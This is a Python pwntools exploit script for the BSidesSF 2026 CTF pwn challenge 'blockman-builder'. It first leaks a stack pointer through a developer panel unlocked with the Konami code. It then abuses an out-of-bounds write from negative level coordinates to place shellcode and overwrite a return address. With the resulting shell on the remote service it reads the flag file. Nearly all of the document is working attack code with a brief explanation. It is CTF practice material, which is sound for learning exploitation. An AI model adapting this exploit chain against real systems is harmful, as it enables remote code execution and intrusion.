#!/usr/bin/env python3
"""
blockman-builder exploit — BSidesSF 2026 PWN (840 pts)

Vuln: OOB write in load_level_from_text — single-block path allows negative
      x1/y1 coords (signed checks: x1 < width, y1 <= 31, no lower bound)
      world buffer on main's stack → overwrite show_level_import's ret addr

Exploit:
  1. Import narrow level (width=64) so dev panel fits in 120-col terminal
  2. Konami code → developer_mode
  3. Build (editor) → parse dev panel for world ptr leak (stack address)
  4. Quit editor → Import exploit level:
     a. Shellcode at world[1][0..N]
     b. Ret addr overwrite at y=0, x=-72..-65 → shellcode on executable stack
  5. show_level_import returns → shellcode → cat /home/ctf/flag.txt
"""
from pwn import *
import time, re, pyte, base64, zlib, sys

context.arch = 'amd64'

HOST = 'blockman-builder-1ecf087f.challenges.bsidessf.net'
PORT = 1184
COLS, ROWS = 120, 60

LOCAL = '--local' in sys.argv

UP=b'\x1bOA'; DOWN=b'\x1bOB'; LEFT=b'\x1bOD'; RIGHT=b'\x1bOC'; ENTER=b'\n'

def make_narrow_level():
    """Width=64 level so dev panel fits in 120 cols"""
    lines = ["clear", "64", "0", "0"]
    text = '\n'.join(lines) + '\n'
    return base64.b64encode(zlib.compress(text.encode())).decode()

def make_exploit_level(world_ptr):
    """
    Offset from world[0][0] to show_level_import's ret addr = -72
    Shellcode at world[1][0..N], addr = world_ptr + 512
    """
    shellcode = asm(shellcraft.sh())
    log.info(f"Shellcode: {len(shellcode)} bytes")

    lines = ["clear", "512", "0"]
    blocks = []

    for i, byte in enumerate(shellcode):
        tile = byte if byte < 128 else byte - 256
        blocks.append(f"{tile},{i},1")

    shellcode_addr = world_ptr + 512
    ret_bytes = p64(shellcode_addr)
    log.info(f"Shellcode addr: {hex(shellcode_addr)}")

    for i in range(8):
        byte = ret_bytes[i]
        tile = byte if byte < 128 else byte - 256
        blocks.append(f"{tile},{-72 + i},0")

    lines.append(str(len(blocks)))
    lines.extend(blocks)

    text = '\n'.join(lines) + '\n'
    return base64.b64encode(zlib.compress(text.encode())).decode()

def do_import(io, screen, stream, payload):
    """Navigate to Import and send payload"""
    # Navigate to Import (index 3)
    for _ in range(3):
        io.send(DOWN); time.sleep(0.3); recv_feed(io, screen, stream, 0.3)
    io.send(ENTER); time.sleep(1); recv_feed(io, screen, stream, 1)
    io.sendline(payload.encode())
    time.sleep(0.5)
    io.sendline(b'')
    time.sleep(2)
    recv_feed(io, screen, stream, 2)

def recv_feed(io, screen, stream, t=1.0):
    try:
        raw = io.recv(timeout=t)
        stream.feed(raw.decode('latin-1'))
        return raw
    except:
        return b''

def main():
    screen = pyte.Screen(COLS, ROWS)
    stream = pyte.Stream(screen)

    if LOCAL:
        io = process(['./bmb', '--keys', 'keys-us.txt', '--level', 'level.txt'],
                     env={'TERM': 'xterm-256color', 'LINES': str(ROWS), 'COLUMNS': str(COLS)},
                     cwd='/home/ubuntu/bsidesSF2026/pwn/blockman-builder')
    else:
        io = remote(HOST, PORT)

    io.timeout = 10

    # Wait for menu
    time.sleep(3)
    recv_feed(io, screen, stream, 5)
    log.info("Menu loaded")

    # === Step 1: Import narrow level ===
    log.info("Importing narrow level (width=64)...")
    do_import(io, screen, stream, make_narrow_level())
    log.info("Narrow level imported")

    # === Step 2: Konami code ===
    log.info("Sending Konami code...")
    for key in [UP, UP, DOWN, DOWN, LEFT, RIGHT, LEFT, RIGHT]:
        io.send(key); time.sleep(0.3); recv_feed(io, screen, stream, 0.3)
    io.send(ENTER); time.sleep(1)
    recv_feed(io, screen, stream, 1)
    log.success("Konami code sent")

    # === Step 3: Build (editor) for leak ===
    io.send(DOWN); time.sleep(0.5)
    recv_feed(io, screen, stream, 0.5)
    io.send(ENTER); time.sleep(3)
    recv_feed(io, screen, stream, 3)
    log.info("Entered editor")

    full = '\n'.join(screen.display)
    world_ptr_m = re.search(r'world=(0x[0-9a-f]+)', full)
    world_addr_m = re.search(r'world addr=(0x[0-9a-f]+)', full)

    if not world_ptr_m:
        log.error("No world ptr leak!")
        for i, line in enumerate(screen.display):
            s = line.rstrip()
            if s: print(f"[{i:2d}] {s[:120]}")
        io.interactive()
        return

    world_ptr = int(world_ptr_m.group(1), 16)
    log.success(f"world ptr (stack): {hex(world_ptr)}")
    if world_addr_m:
        log.success(f"world addr (BSS): {world_addr_m.group(1)}")

    # === Step 4: Quit editor ===
    io.send(b'q'); time.sleep(1)
    recv_feed(io, screen, stream, 1)
    io.send(b'n'); time.sleep(1)
    recv_feed(io, screen, stream, 1)
    log.info("Back to menu")

    # === Step 5: Import exploit level ===
    log.info("Importing exploit level...")
    do_import(io, screen, stream, make_exploit_level(world_ptr))
    log.success("Exploit sent!")

    # Got shell — send commands
    time.sleep(1)
    io.sendline(b'cat /home/ctf/flag.txt')
    time.sleep(2)
    try:
        result = io.recv(timeout=5)
        clean = re.sub(rb'\x1b\[[0-9;]*[A-Za-z]', b'', result)
        clean = re.sub(rb'\x1b\([0-9A-Z]', b'', clean)
        clean = re.sub(rb'\x1b[=>]', b'', clean)
        flag = re.search(rb'CTF\{[^}]+\}', clean)
        if flag:
            log.success(f"FLAG: {flag.group().decode()}")
        else:
            log.info(f"Response: {result}")
    except:
        pass
    io.interactive()

if __name__ == '__main__':
    main()
